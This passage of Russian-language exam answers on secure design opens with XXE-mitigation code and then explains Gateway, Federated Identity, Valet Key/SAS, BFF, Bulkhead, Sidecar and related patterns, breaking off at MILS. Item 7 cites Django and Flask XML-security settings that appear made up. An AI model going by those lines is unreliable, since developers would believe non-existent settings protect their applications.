ALLOWED_ATTRIBUTES = {'id', 'type'}

def validate_xml_structure(root):
    """Валидация структуры XML по whitelist"""
    for elem in root.iter():
        if elem.tag not in ALLOWED_ELEMENTS:
            raise ValueError(f"Element not allowed: {elem.tag}")
        
        for attr in elem.attrib:
            if attr not in ALLOWED_ATTRIBUTES:
                raise ValueError(f"Attribute not allowed: {attr}")
```

**5. Ограничение размера XML:**
```python
MAX_XML_SIZE = 10 * 1024  # 10 KB

def parse_xml_safely(xml_string):
    """Безопасный парсинг XML с ограничением размера"""
    if len(xml_string) > MAX_XML_SIZE:
        raise ValueError("XML too large")
    
    parser = etree.XMLParser(resolve_entities=False)
    tree = etree.fromstring(xml_string, parser)
    return tree
```

**6. Использование JSON вместо XML:**
```python
# Предпочтительно использовать JSON вместо XML
import json

# JSON не поддерживает внешние сущности
data = json.loads(user_input)  # Безопасно
```

**7. Конфигурация на уровне приложения:**
```python
# Django - отключение XXE
# settings.py
SECURE_XXE_PROCESSING = False

# Flask
app.config['XML_PARSER_SECURE'] = True
```

**8. Использование Content Security Policy:**
```python
# Запрет загрузки внешних ресурсов
response.headers['Content-Security-Policy'] = "default-src 'self'"
```

**9. Полный пример безопасной обработки XML:**
```python
from defusedxml import ElementTree
from lxml import etree
import re

class SafeXMLProcessor:
    def __init__(self):
        self.max_size = 10 * 1024
        self.allowed_elements = {'user', 'name', 'email'}
    
    def process_xml(self, xml_string):
        # 1. Проверка размера
        if len(xml_string) > self.max_size:
            raise ValueError("XML too large")
        
        # 2. Удаление DOCTYPE
        xml_string = re.sub(r'<!DOCTYPE[^>]*>', '', xml_string, flags=re.IGNORECASE)
        
        # 3. Безопасный парсинг
        try:
            # Использование defusedxml
            tree = ElementTree.fromstring(xml_string)
        except Exception as e:
            raise ValueError(f"Invalid XML: {e}")
        
        # 4. Валидация структуры
        for elem in tree.iter():
            if elem.tag not in self.allowed_elements:
                raise ValueError(f"Element not allowed: {elem.tag}")
        
        return tree

# Использование
processor = SafeXMLProcessor()
tree = processor.process_xml(user_xml)
```

**10. Конфигурация веб-сервера:**
```nginx
# Nginx - ограничение размера тела запроса
client_max_body_size 10k;
```

**Рекомендации:**
- Отключите обработку внешних сущностей
- Используйте безопасные парсеры (defusedxml)
- Валидируйте структуру XML по whitelist
- Ограничивайте размер XML
- Предпочитайте JSON вместо XML
- Регулярно обновляйте XML-парсеры
- Используйте статический анализ для поиска уязвимостей XXE

---

## Источники:
- OWASP Top 10 (2021)
- CWE (Common Weakness Enumeration)
- OWASP Testing Guide
- Secure Coding Practices
- Best practices в области безопасного программирования

# Ответы на вопросы к зачёту
## Раздел 5: Архитектурные паттерны и практики безопасного проектирования

### 101. Что такое паттерн «Привратник (Gateway)» и зачем он нужен?

**Ответ:** Паттерн **"Gateway" (Привратник)** — это единая точка входа, которая служит посредником между клиентами и внутренними микросервисами или системами, централизованно обрабатывая запросы и обеспечивая общие функции.

**Основные функции Gateway:**

1. **Маршрутизация запросов** — направление запросов к соответствующим микросервисам
2. **Аутентификация и авторизация** — централизованная проверка прав доступа
3. **Rate limiting** — ограничение количества запросов от клиентов
4. **Балансировка нагрузки** — распределение нагрузки между экземплярами сервисов
5. **Мониторинг и логирование** — централизованный сбор метрик и логов
6. **Преобразование протоколов** — преобразование между HTTP/REST, gRPC, WebSocket и др.
7. **Кэширование** — кэширование ответов для улучшения производительности
8. **SSL/TLS терминация** — обработка шифрования на уровне Gateway
9. **Валидация запросов** — проверка формата и содержимого запросов
10. **Защита от атак** — WAF, DDoS-защита, фильтрация вредоносных запросов

**Пример архитектуры:**

```
Клиенты → API Gateway → [Микросервис 1, Микросервис 2, Микросервис 3]
```

**Зачем нужен:**
- **Централизация безопасности** — единая точка для применения политик безопасности
- **Упрощение клиентского доступа** — клиенты обращаются к одному endpoint
- **Изоляция микросервисов** — внутренние сервисы не доступны напрямую извне
- **Снижение сложности** — общие функции реализуются один раз в Gateway
- **Улучшение производительности** — кэширование и оптимизация запросов

---

### 102. В чём преимущество использования Gateway перед прямым доступом к микросервисам?

**Ответ:** Преимущества использования Gateway перед прямым доступом к микросервисам:

**1. Безопасность:**
- **Единая точка аутентификации** — проверка прав один раз в Gateway, а не в каждом сервисе
- **Изоляция внутренних сервисов** — микросервисы недоступны извне, только через Gateway
- **Централизованная защита** — WAF, rate limiting, валидация в одном месте
- **Упрощение управления ключами** — клиенты общаются только с Gateway

**2. Управляемость:**
- **Централизованное логирование** — все запросы логируются в одном месте
- **Мониторинг** — единая точка для сбора метрик
- **Упрощение обновлений** — изменения в политиках применяются один раз
- **Версионирование API** — управление версиями API в Gateway

**3. Производительность:**
- **Кэширование** — Gateway может кэшировать ответы от нескольких сервисов
- **Агрегация запросов** — объединение нескольких запросов в один
- **Оптимизация протоколов** — преобразование между разными протоколами

**4. Масштабируемость:**
- **Балансировка нагрузки** — Gateway распределяет нагрузку между экземплярами
- **Динамическая маршрутизация** — автоматическое обнаружение и маршрутизация к сервисам
- **Градуальное развёртывание** — Gateway может направлять трафик на разные версии сервисов

**5. Упрощение клиентского кода:**
- **Единый endpoint** — клиенты обращаются к одному адресу вместо множества
- **Упрощение аутентификации** — один токен для всех сервисов
- **Стандартизация API** — единый формат ответов

**6. Снижение связанности:**
- **Слабая связанность** — клиенты не зависят от внутренней структуры сервисов
- **Независимое развёртывание** — изменения в сервисах не затрагивают клиентов
- **Абстракция** — Gateway скрывает сложность внутренней архитектуры

**Пример:**

**Без Gateway:**
```
Клиент → Микросервис A (аутентификация)
Клиент → Микросервис B (аутентификация)
Клиент → Микросервис C (аутентификация)
```

**С Gateway:**
```
Клиент → Gateway (аутентификация) → Микросервис A
                                    → Микросервис B
                                    → Микросервис C
```

---

### 103. Что такое паттерн «Федеративное удостоверение»?

**Ответ:** Паттерн **"Федеративное удостоверение (Federated Identity)"** — это подход к управлению аутентификацией и авторизацией, при котором пользователи могут использовать свои учётные данные из одного домена (провайдера удостоверений, IdP) для доступа к приложениям в других доменах (провайдерам услуг, SP).

**Основные компоненты:**

1. **Identity Provider (IdP)** — провайдер удостоверений, который аутентифицирует пользователей (Google, Microsoft Azure AD, Okta, корпоративный Active Directory)

2. **Service Provider (SP)** — приложение или сервис, который предоставляет услуги после аутентификации через IdP

3. **Протоколы федерации:**
   - **SAML 2.0** — для корпоративных приложений
   - **OAuth 2.0 / OpenID Connect** — для веб и мобильных приложений
   - **WS-Federation** — для веб-сервисов Microsoft

**Преимущества:**

1. **Single Sign-On (SSO)** — пользователь входит один раз и получает доступ ко всем приложениям
2. **Централизованное управление** — управление пользователями в одном месте
3. **Упрощение для пользователей** — не нужно запоминать множество паролей
4. **Повышенная безопасность** — специализированные IdP лучше защищают учётные данные
5. **Снижение административных затрат** — не нужно управлять учётными записями в каждом приложении

**Архитектура:**

```
Пользователь → Приложение (SP) → Редирект на IdP → Аутентификация → 
IdP → Выдача токена/assertion → Приложение → Проверка токена → Доступ предоставлен
```

**Пример использования:**

```python
# Приложение (SP) перенаправляет на IdP
@app.route('/login')
def login():
    # Редирект на провайдера удостоверений
    saml_request = create_saml_authn_request()
    return redirect(f"{IDP_URL}?SAMLRequest={saml_request}")

# IdP аутентифицирует пользователя и возвращает assertion
@app.route('/sso/callback')
def callback():
    saml_response = request.form.get('SAMLResponse')
    assertion = verify_saml_response(saml_response)
    
    # Создание сессии на основе assertion
    session['user'] = assertion.attributes
    return redirect('/dashboard')
```

**Сценарии использования:**
- Корпоративные приложения с единым входом
- Партнёрские порталы
- Облачные приложения SaaS
- Мобильные приложения с социальным входом

---

### 104. Почему не рекомендуется реализовывать собственную систему хранения паролей?

**Ответ:** Не рекомендуется реализовывать собственную систему хранения паролей по следующим причинам:

**1. Сложность правильной реализации:**
- **Хеширование паролей** — необходимо использовать криптографически стойкие алгоритмы (bcrypt, Argon2, scrypt), а не MD5 или SHA-1
- **Salt** — необходимо генерировать уникальную соль для каждого пароля
- **Итерации** — правильный выбор количества итераций для замедления брутфорса
- **Защита от timing attacks** — постоянное время выполнения для предотвращения утечки информации

**2. Высокий риск ошибок:**
- **Уязвимости** — легко допустить ошибки, которые приведут к компрометации всех паролей
- **Накопление технического долга** — сложно обновлять систему при появлении новых уязвимостей
- **Отсутствие экспертизы** — большинство разработчиков не являются экспертами по криптографии

**3. Правовые и нормативные требования:**
- **GDPR, ФЗ-152** — требования к защите персональных данных
- **Стандарты** — необходимо соответствие стандартам безопасности (ISO 27001, PCI DSS)
- **Аудит** — необходимость прохождения аудитов безопасности

**4. Дополнительные функции безопасности:**
- **Защита от брутфорса** — rate limiting, блокировка после неудачных попыток
- **Проверка на утечки** — интеграция с сервисами проверки (Have I Been Pwned)
- **Политики паролей** — сложность, длина, требования к символам
- **Двухфакторная аутентификация (2FA)** — поддержка TOTP, SMS, аппаратных ключей
- **Восстановление пароля** — безопасный процесс сброса пароля

**5. Затраты на поддержку:**
- **Обновления** — необходимость обновления при обнаружении уязвимостей
- **Мониторинг** — отслеживание попыток взлома и аномальной активности
- **Обучение** — обучение команды современным практикам безопасности

**Рекомендуемые альтернативы:**

1. **Использование готовых решений:**
   - **Auth0** — облачный сервис аутентификации
   - **AWS Cognito** — сервис управления пользователями
   - **Azure AD B2C** — решение Microsoft
   - **Keycloak** — open-source решение
   - **Okta** — корпоративное решение

2. **Использование проверенных библиотек:**
   - **Passport.js** (Node.js) — с поддержкой различных стратегий
   - **Django Auth** (Python) — встроенная система Django
   - **Spring Security** (Java) — фреймворк безопасности Spring
   - **ASP.NET Identity** (.NET) — решение Microsoft

3. **Использование федеративной аутентификации:**
   - OAuth 2.0 / OpenID Connect
   - SAML 2.0
   - Позволяет делегировать хранение паролей проверенным провайдерам

**Если всё же необходимо хранить пароли:**

```python
# Использование проверенной библиотеки
import bcrypt

# Хеширование пароля
def hash_password(password: str) -> str:
    salt = bcrypt.gensalt(rounds=12)  # Достаточное количество раундов
    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
    return hashed.decode('utf-8')

# Проверка пароля
def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(
        password.encode('utf-8'),
        hashed.encode('utf-8')
    )
```

**Рекомендация:** Используйте готовые проверенные решения вместо собственной реализации, если только у вас нет команды криптографов и экспертов по безопасности.

---

### 105. Что такое паттерн «Ключ валета (Valet Key)»?

**Ответ:** Паттерн **"Valet Key" (Ключ валета)** — это паттерн безопасности, при котором предоставляется временный, ограниченный токен доступа (Shared Access Signature, SAS) к конкретному ресурсу вместо постоянных полных учётных данных.

**Концепция:**
Аналогия с реальным ключом валета: вместо того чтобы дать кому-то полный доступ к вашему дому (постоянный ключ), вы даёте временный ключ только для входа в гараж на определённое время.

**Характеристики Valet Key:**

1. **Временный доступ** — токен действителен только в течение ограниченного периода
2. **Ограниченные права** — только необходимые операции (чтение, запись, удаление)
3. **Ограничение ресурсов** — доступ только к конкретному объекту или контейнеру
4. **Нельзя отозвать** — после выдачи токен нельзя отозвать до истечения срока
5. **Прямой доступ** — клиент обращается напрямую к ресурсу, минуя сервер

**Пример использования в облачных хранилищах:**

```python
from datetime import datetime, timedelta
import boto3

# Генерация временного токена для доступа к объекту S3
def generate_valet_key(bucket, object_key, user_id):
    s3_client = boto3.client('s3')
    
    # Генерация предварительно подписанного URL (Presigned URL)
    url = s3_client.generate_presigned_url(
        'get_object',
        Params={
            'Bucket': bucket,
            'Key': object_key
        },
        ExpiresIn=3600  # 1 час
    )
    
    return {
        'url': url,
        'expires_at': (datetime.utcnow() + timedelta(hours=1)).isoformat(),
        'bucket': bucket,
        'object_key': object_key
    }
```

**Преимущества:**

1. **Безопасность** — при компрометации токена ущерб ограничен (только один объект на ограниченное время)
2. **Производительность** — клиент загружает файлы напрямую в облако, не нагружая сервер
3. **Масштабируемость** — снижение нагрузки на сервер приложений
4. **Гибкость** — разные токены с разными правами для разных пользователей

**Использование:**

```python
# Пользователь запрашивает возможность загрузить файл
@app.route('/upload/request')
def request_upload():
    user_id = current_user.id
    file_name = request.json['filename']
    
    # Генерация valet key для загрузки
    valet_key = generate_valet_key(
        bucket='user-uploads',
        object_key=f'{user_id}/{file_name}',
        user_id=user_id
    )
    
    # Возвращаем токен клиенту
    return jsonify({
        'upload_url': valet_key['url'],
        'expires_in': 3600
    })

# Клиент использует URL для прямой загрузки в S3
# fetch(valet_key.url, { method: 'PUT', body: file })
```

**Сравнение с постоянным ключом:**

**Постоянный ключ:**
- Действует бессрочно
- Полный доступ ко всем ресурсам
- При компрометации — полный доступ злоумышленника
- Необходимо хранить на сервере

**Valet Key (SAS токен):**
- Временный (минуты/часы)
- Ограниченный доступ к конкретному ресурсу
- При компрометации — минимальный ущерб
- Генерируется по требованию

---

### 106. В чём отличие постоянного ключа от временного SAS-токена?

**Ответ:** Отличия постоянного ключа от временного SAS-токена (Shared Access Signature):

**Постоянный ключ (Permanent Key):**

1. **Срок действия:**
   - Действует бессрочно или до явной отмены
   - Требует ручного управления жизненным циклом

2. **Область доступа:**
   - Полный доступ ко всем ресурсам в учётной записи/сервисе
   - Доступ ко всем операциям (чтение, запись, удаление, управление)

3. **Безопасность:**
   - При компрометации — полный доступ злоумышленника ко всем ресурсам
   - Высокий риск утечки
   - Сложность отзыва при компрометации

4. **Хранение:**
   - Должен храниться на сервере в безопасном месте
   - Нельзя передавать клиентам
   - Требует управления секретами (Vault, Secrets Manager)

5. **Использование:**
   - Используется сервером для операций от имени пользователей
   - Все запросы идут через сервер приложений

6. **Пример:**
   ```python
   # Постоянный ключ AWS
   AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
   AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
   # Действует до явной отмены
   ```

**Временный SAS-токен (Temporary SAS Token):**

1. **Срок действия:**
   - Временный (обычно минуты, часы, максимум несколько дней)
   - Автоматически истекает через заданное время
   - Не требует ручного управления

2. **Область доступа:**
   - Ограниченный доступ к конкретному ресурсу (объект, контейнер)
   - Только разрешённые операции (например, только чтение или только запись)
   - Можно ограничить по IP-адресу, протоколу (HTTPS)

3. **Безопасность:**
   - При компрометации — минимальный ущерб (только один ресурс на короткое время)
   - Низкий риск утечки (токен действителен ограниченное время)
   - Автоматическая отмена через истечение срока

4. **Хранение:**
   - Генерируется по требованию
   - Можно передавать клиентам (в URL)
   - Не требуется долгосрочное хранение

5. **Использование:**
   - Используется клиентами для прямого доступа к ресурсам
   - Запросы идут напрямую к хранилищу, минуя сервер приложений

6. **Пример:**
   ```python
   # Временный SAS токен Azure Blob Storage
   sas_token = generate_blob_sas(
       account_name='storage',
       container_name='uploads',
       blob_name='file.pdf',
       permission=BlobSasPermissions(read=True),
       expiry=datetime.utcnow() + timedelta(hours=1)  # Истекает через 1 час
   )
   
   url = f"https://storage.blob.core.windows.net/uploads/file.pdf?{sas_token}"
   # Действует только 1 час
   ```

**Сравнительная таблица:**

| Характеристика | Постоянный ключ | SAS-токен |
|----------------|-----------------|-----------|
| Срок действия | Бессрочный | Временный (минуты-дни) |
| Область доступа | Все ресурсы | Конкретный ресурс |
| Права доступа | Полные | Ограниченные |
| Безопасность | Высокий риск | Низкий риск |
| Хранение | На сервере | Временное |
| Передача клиенту | Нет | Да (в URL) |
| Отзыв | Ручной | Автоматический |
| Нагрузка на сервер | Высокая | Низкая |

**Рекомендации:**
- Используйте **постоянные ключи** для серверных операций и управления ресурсами
- Используйте **SAS-токены** для предоставления клиентам временного доступа к ресурсам
- Никогда не передавайте постоянные ключи клиентам
- Генерируйте SAS-токены с минимально необходимыми правами и временем действия

---

### 107. Что такое паттерн «BFF (Backend for Frontend)»?

**Ответ:** Паттерн **"BFF (Backend for Frontend)"** — это архитектурный паттерн, при котором создаётся отдельный серверный компонент (backend) специально для каждого типа клиентского приложения (web, mobile, desktop), который адаптирует данные и функциональность микросервисов под специфические потребности конкретного фронтенда.

**Концепция:**

Вместо того чтобы все клиенты обращались напрямую к микросервисам, каждый тип клиента имеет свой собственный BFF, который:
- Агрегирует данные из нескольких микросервисов
- Оптимизирует ответы под конкретный клиент
- Упрощает API для клиента
- Реализует клиент-специфичную логику

**Архитектура:**

```
Web App → Web BFF → [Микросервис A, Микросервис B, Микросервис C]
Mobile App → Mobile BFF → [Микросервис A, Микросервис B, Микросервис C]
Desktop App → Desktop BFF → [Микросервис A, Микросервис B, Микросервис C]
```

**Преимущества:**

1. **Оптимизация под клиента:**
   - Web BFF может возвращать HTML-шаблоны
   - Mobile BFF может возвращать минимальный JSON для экономии трафика
   - Desktop BFF может возвращать полные данные для офлайн-режима

2. **Упрощение клиентского кода:**
   - Клиент делает один запрос вместо нескольких
   - BFF агрегирует данные из разных микросервисов
   - Клиент получает готовые данные в удобном формате

3. **Независимое развёртывание:**
   - Изменения в микросервисах не затрагивают клиентов
   - BFF изолирует изменения в backend от frontend
   - Разные версии BFF для разных версий клиентов

4. **Безопасность:**
   - BFF проверяет права доступа перед запросами к микросервисам
   - Клиенты не имеют прямого доступа к микросервисам
   - Централизованная обработка ошибок и валидации

**Пример реализации:**

```python
# Web BFF для веб-приложения
@app.route('/api/web/dashboard')
def web_dashboard():
    user_id = current_user.id
    
    # Агрегация данных из нескольких микросервисов
    user_service = UserService()
    order_service = OrderService()
    notification_service = NotificationService()
    
    # Параллельные запросы
    user_data = user_service.get_user(user_id)
    orders = order_service.get_recent_orders(user_id, limit=5)
    notifications = notification_service.get_unread(user_id)
    
    # Оптимизация для веб: включить только необходимые поля
    return jsonify({
        'user': {
            'name': user_data['name'],
            'email': user_data['email'],
            'avatar': user_data['avatar']
        },
        'recent_orders': orders,
        'notifications': notifications
    })

# Mobile BFF для мобильного приложения
@app.route('/api/mobile/dashboard')
def mobile_dashboard():
    user_id = current_user.id
    
    # Для мобильного: минимум данных для экономии трафика
    user_data = user_service.get_user(user_id)
    orders = order_service.get_recent_orders(user_id, limit=3)
    
    # Минимальный JSON
    return jsonify({
        'user': user_data['name'],
        'orders': [{'id': o['id'], 'status': o['status']} for o in orders]
    })
```

**Когда использовать:**

- Разные типы клиентов с разными требованиями
- Необходимость оптимизации данных для каждого клиента
- Сложная агрегация данных из множества микросервисов
- Необходимость изоляции изменений backend от frontend

**Недостатки:**

- Дублирование логики между BFF
- Дополнительный слой инфраструктуры
- Необходимость поддержки нескольких BFF

---

### 108. Как BFF помогает уменьшить поверхность атаки?

**Ответ:** BFF (Backend for Frontend) помогает уменьшить поверхность атаки следующими способами:

**1. Изоляция микросервисов:**
- **Микросервисы недоступны напрямую** — клиенты не могут обращаться напрямую к внутренним сервисам
- **Ограничение экспонированных эндпоинтов** — доступны только те API, которые предоставляет BFF
- **Скрытие внутренней архитектуры** — клиенты не знают о структуре микросервисов

**2. Централизованная валидация:**
```python
# BFF валидирует все входные данные
@app.route('/api/web/orders')
def create_order():
    # Валидация перед передачей в микросервис
    data = request.json
    if not validate_order_data(data):
        return "Invalid data", 400
    
    # Только валидированные данные передаются в микросервис
    order_service.create_order(data)
```

**3. Централизованная аутентификация и авторизация:**
- **Единая точка проверки прав** — BFF проверяет права доступа один раз
- **Контроль доступа** — BFF ограничивает доступ к функциям на основе прав пользователя
- **Защита от несанкционированного доступа** — микросервисы не нужно защищать индивидуально

**4. Фильтрация данных:**
```python
# BFF фильтрует чувствительные данные
@app.route('/api/mobile/user')
def get_user():
    user_data = user_service.get_user(user_id)
    
    # Удаление чувствительных данных для мобильного клиента
    filtered = {
        'name': user_data['name'],
        'email': user_data['email'],
        # 'credit_card': удалено для безопасности
        # 'ssn': удалено для безопасности
    }
    return jsonify(filtered)
```

**5. Ограничение функциональности:**
- **Только необходимые операции** — BFF предоставляет только те функции, которые нужны клиенту
- **Запрет административных операций** — клиенты не могут выполнять опасные операции
- **Ограничение параметров** — BFF ограничивает параметры запросов

**6. Защита от атак:**
```python
# BFF реализует защиту от атак
@app.route('/api/web/search')
@rate_limit(per_minute=60)  # Rate limiting
@validate_input  # Валидация
@sanitize_output  # Санитизация выходных данных
def search():
    query = request.args.get('q')
    # BFF защищает от XSS, SQL injection, и других атак
    results = search_service.search(sanitize(query))
    return jsonify(sanitize_output(results))
```

**7. Мониторинг и логирование:**
- **Централизованное логирование** — все запросы логируются в BFF
- **Обнаружение аномалий** — BFF может обнаружить подозрительную активность
- **Аудит доступа** — все обращения к данным проходят через BFF

**8. Версионирование и депрекация:**
- **Контроль версий API** — старые версии API могут быть отключены в BFF
- **Постепенная миграция** — BFF может направлять запросы к разным версиям микросервисов

**Пример архитектуры безопасности:**

```
Интернет
  ↓
[WAF / DDoS Protection]
  ↓
[API Gateway] ← Аутентификация, Rate Limiting
  ↓
[BFF] ← Валидация, Авторизация, Фильтрация
  ↓
[Микросервисы] ← Защищены, недоступны извне
```

**Преимущества для безопасности:**
- Единая точка применения политик безопасности
- Упрощение аудита и мониторинга
- Изоляция внутренних компонентов
- Снижение риска прямых атак на микросервисы

---

### 109. Что такое паттерн «Bulkhead (Отсек)» и как он повышает отказоустойчивость?

**Ответ:** Паттерн **"Bulkhead (Отсек)"** — это паттерн изоляции, который разделяет элементы приложения на пулы изолированных ресурсов, чтобы сбой в одной части системы не приводил к отказу всей системы.

**Концепция:**
Аналогия с кораблём: отсеки (bulkheads) изолируют воду в случае пробоины, предотвращая затопление всего корабля.

**Применение в программном обеспечении:**

**1. Изоляция пулов соединений:**
```python
# Разделение пулов соединений к базе данных
class DatabasePoolManager:
    def __init__(self):
        # Отдельный пул для критичных операций
        self.critical_pool = create_pool(max_connections=10, name='critical')
        
        # Отдельный пул для некритичных операций
        self.normal_pool = create_pool(max_connections=20, name='normal')
        
        # Отдельный пул для отчётов (не критично)
        self.reporting_pool = create_pool(max_connections=5, name='reporting')
    
    def get_critical_connection(self):
        return self.critical_pool.get_connection()
    
    def get_normal_connection(self):
        return self.normal_pool.get_connection()
```

**2. Изоляция потоков/процессов:**
```python
# Разделение worker-процессов по типам задач
# Критичные задачи в отдельном пуле
critical_executor = ThreadPoolExecutor(max_workers=5, thread_name_prefix='critical')

# Некритичные задачи в другом пуле
normal_executor = ThreadPoolExecutor(max_workers=20, thread_name_prefix='normal')
```

**3. Изоляция ресурсов по клиентам:**
```python
# Разделение ресурсов по клиентам/тенантам
class TenantIsolation:
    def __init__(self):
        # Каждый тенант имеет свой пул ресурсов
        self.tenant_pools = {}
    
    def get_pool_for_tenant(self, tenant_id):
        if tenant_id not in self.tenant_pools:
            self.tenant_pools[tenant_id] = create_pool(max_connections=10)
        return self.tenant_pools[tenant_id]
```

**4. Изоляция в микросервисах:**
```yaml
# Kubernetes: отдельные deployment для разных типов нагрузок
# Критичный сервис
apiVersion: apps/v1
kind: Deployment
metadata:
  name: critical-service
spec:
  replicas: 3
  resources:
    requests:
      cpu: "1"
      memory: "2Gi"
---
# Некритичный сервис (отдельный отсек)
apiVersion: apps/v1
kind: Deployment
metadata:
  name: non-critical-service
spec:
  replicas: 2
  resources:
    requests:
      cpu: "0.5"
      memory: "1Gi"
```

**Как повышает отказоустойчивость:**

1. **Предотвращение каскадных отказов:**
   - Сбой в некритичной части не влияет на критичную
   - Перегрузка одного пула не блокирует другие

2. **Ограничение распространения проблем:**
   - Утечка памяти в одном отсеке не влияет на другие
   - Блокировки в одном пуле не блокируют другие операции

3. **Гранулярное масштабирование:**
   - Можно увеличивать ресурсы для критичных частей независимо
   - Некритичные части могут использовать меньше ресурсов

4. **Приоритизация:**
   - Критичные операции всегда имеют доступ к ресурсам
   - Некритичные операции не могут исчерпать ресурсы критичных

**Пример реализации:**
```python
from concurrent.futures import ThreadPoolExecutor
import threading

class BulkheadExecutor:
    def __init__(self):
        # Отдельные executor'ы для разных типов задач
        self.critical_executor = ThreadPoolExecutor(max_workers=5)
        self.normal_executor = ThreadPoolExecutor(max_workers=20)
    
    def execute_critical(self, task):
        # Критичные задачи в изолированном пуле
        return self.critical_executor.submit(task)
    
    def execute_normal(self, task):
        # Некритичные задачи в отдельном пуле
        return self.normal_executor.submit(task)

# Использование
executor = BulkheadExecutor()

# Критичная операция платежа - изолирована
payment_future = executor.execute_critical(process_payment)

# Некритичная отправка email - не блокирует платежи
email_future = executor.execute_normal(send_notification)
```

---

### 110. Что такое паттерн «Database per Service»?

**Ответ:** Паттерн **"Database per Service"** — это архитектурный паттерн микросервисов, при котором каждый микросервис имеет свою собственную базу данных, к которой имеют доступ только этот сервис и никакой другой.

**Принципы:**

1. **Изоляция данных:** Каждый сервис владеет своими данными
2. **Независимость:** Сервисы могут использовать разные типы БД
3. **Автономность:** Изменения схемы БД одного сервиса не влияют на другие
4. **Масштабируемость:** Каждая БД масштабируется независимо

**Архитектура:**

```
Микросервис A → База данных A (PostgreSQL)
Микросервис B → База данных B (MongoDB)
Микросервис C → База данных C (Redis)
```

**Преимущества:**

1. **Независимое развёртывание:**
   - Изменение схемы БД одного сервиса не требует координации с другими
   - Каждый сервис может использовать оптимальную для него БД

2. **Изоляция отказов:**
   - Сбой одной БД не влияет на другие сервисы
   - Можно применять разные стратегии резервного копирования

3. **Производительность:**
   - Каждая БД оптимизирована под конкретный сервис
   - Нет конкуренции за ресурсы между сервисами

4. **Безопасность:**
   - Каждый сервис имеет доступ только к своим данным
   - Упрощение контроля доступа

**Пример:**

```python
# Сервис пользователей
class UserService:
    def __init__(self):
        # Своя БД для пользователей
        self.db = PostgreSQLConnection('user_db')
    
    def get_user(self, user_id):
        return self.db.query("SELECT * FROM users WHERE id = %s", user_id)

# Сервис заказов
class OrderService:
    def __init__(self):
        # Своя БД для заказов
        self.db = PostgreSQLConnection('order_db')
    
    def get_order(self, order_id):
        return self.db.query("SELECT * FROM orders WHERE id = %s", order_id)
```

**Проблемы и решения:**

1. **Согласованность данных:**
   - Проблема: Транзакции между сервисами невозможны
   - Решение: Использование паттернов Saga, Event Sourcing, CQRS

2. **Дублирование данных:**
   - Проблема: Данные могут дублироваться между сервисами
   - Решение: Принятие дублирования как компромисса за изоляцию

3. **Сложность запросов:**
   - Проблема: Сложно делать запросы, требующие данных из нескольких сервисов
   - Решение: API-композиция, агрегация на уровне Gateway или BFF

---

### 111. Что такое Sidecar-паттерн и как он используется для безопасности?

**Ответ:** Паттерн **"Sidecar"** — это архитектурный паттерн, при котором вспомогательный компонент (sidecar) развёртывается вместе с основным приложением в том же контейнере или поде, предоставляя дополнительные функции без изменения основного приложения.

**Концепция:**
Аналогия с мотоциклом с коляской: sidecar — это дополнительный компонент, который работает рядом с основным приложением.

**Использование для безопасности:**

**1. Проксирование и шифрование:**
```yaml
# Kubernetes: Sidecar для TLS-терминации
apiVersion: v1
kind: Pod
spec:
  containers:
  - name: app
    image: myapp:latest
  - name: envoy-sidecar
    image: envoyproxy/envoy:latest
    # Envoy проксирует трафик и обрабатывает TLS
```

**2. Логирование и мониторинг:**
```python
# Sidecar для логирования
class LoggingSidecar:
    def intercept_logs(self):
        # Перехватывает логи приложения и отправляет в централизованное хранилище
        # Безопасное логирование без модификации основного приложения
        pass
```

**3. Аутентификация и авторизация:**
```python
# Sidecar для проверки токенов
class AuthSidecar:
    def validate_request(self, request):
        # Проверяет JWT токены перед передачей в основное приложение
        # Основное приложение получает уже аутентифицированные запросы
        token = request.headers.get('Authorization')
        if not validate_token(token):
            return 401
        return request
```

**4. Шифрование данных:**
```python
# Sidecar для шифрования трафика
class EncryptionSidecar:
    def encrypt_response(self, data):
        # Шифрует данные перед отправкой
        return encrypt(data, key)
    
    def decrypt_request(self, encrypted_data):
        # Расшифровывает входящие данные
        return decrypt(encrypted_data, key)
```

**5. Инъекция секретов:**
```yaml
# Sidecar для управления секретами
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
      - name: app
        image: myapp:latest
      - name: vault-agent-sidecar
        image: vault:latest
        # Автоматически инжектит секреты из Vault в основное приложение
```

**6. WAF (Web Application Firewall):**
```yaml
# Sidecar как WAF
containers:
- name: app
  image: myapp:latest
- name: modsecurity-sidecar
  image: owasp/modsecurity-crs:latest
  # Перехватывает и фильтрует HTTP-запросы
```

**Преимущества для безопасности:**

1. **Изоляция функций безопасности:**
   - Безопасность отделена от бизнес-логики
   - Упрощение обновлений безопасности

2. **Единообразие:**
   - Одинаковые политики безопасности для всех приложений
   - Централизованное управление

3. **Прозрачность:**
   - Основное приложение не знает о безопасности
   - Не требует изменений в коде приложения

4. **Независимое развёртывание:**
   - Обновления безопасности без перезапуска приложения
   - A/B тестирование политик безопасности

**Пример реализации с Envoy:**
```yaml
# Envoy sidecar конфигурация
static_resources:
  listeners:
  - name: listener_0
    address:
      socket_address:
        address: 0.0.0.0
        port_value: 8080
    filter_chains:
    - filters:
      - name: envoy.filters.network.http_connection_manager
        typed_config:
          http_filters:
          - name: envoy.filters.http.jwt_authn  # JWT аутентификация
          - name: envoy.filters.http.router
      route_config:
        routes:
        - match:
            prefix: "/"
          route:
            cluster: service_cluster
```

---

### 112. Что такое MILS-архитектура?

**Ответ:** **MILS (Multiple Independent Levels of Security)** — это архитектура безопасности, основанная на принципе разделения и изоляции компонентов системы по уровням безопасности.

**Основные принципы:**

1. **Разделение (Separation):** Компоненты изолированы друг от друга
2. **Независимость (Independence):** Сбои одного уровня не влияют на другие
3. **Уровни безопасности (Levels of Security):** Разные компоненты могут иметь разные уровни защиты

**Компоненты архитектуры:**

1. **Partitioning (Разделение):**
   - Разделение системы на независимые разделы (partitions)
   - Каждый раздел изолирован от других

2. **Isolation (Изоляция):**
   - Строгая изоляция между разделами
   - Запрет несанкционированного обмена данными

3. **Information Flow Control (Контроль потоков информации):**
   - Контроль направлений потоков данных
   - Предотвращение утечек информации от высокого уровня к низкому

4. **Trusted Components (Доверенные компоненты):**
   - Минимальный набор доверенных компонентов
   - Верификация безопасности доверенных компонентов

**Архитектура:**

```
┌─────────────────────────────────────┐
